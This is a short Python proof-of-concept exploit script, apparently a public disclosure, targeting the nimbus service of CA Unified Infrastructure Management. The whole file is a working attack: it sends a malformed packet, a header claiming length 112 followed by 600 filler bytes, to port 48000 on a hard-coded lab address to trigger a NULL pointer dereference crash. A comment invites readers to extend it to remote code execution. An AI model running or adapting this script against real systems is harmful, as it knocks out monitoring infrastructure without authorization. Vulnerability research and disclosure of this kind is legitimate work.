#!/usr/bin/env python

'''

Exploit Title    : Hasta Luego (NULL PTR Dereference)
Date             : ?/?/19
Author           : wetw0rk
Vendor Homepeage : https://docops.ca.com/ca-unified-infrastructure-management/9-0-2/en
Software Link    : heh
Tested on        : Windows 10

Description : The crash occus when the buffer sent (or packet content) exceeds the
              packet header length. In this POC that would be 112. Was not able to
              get RCE but give it a go if you can ;)

'''

import socket

packet = (
"nimbus/1.0 112 0\r\n"
"mtype\x00"
)
packet += "B" * 600

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("192.168.245.150", 48000))
sock.send(packet)
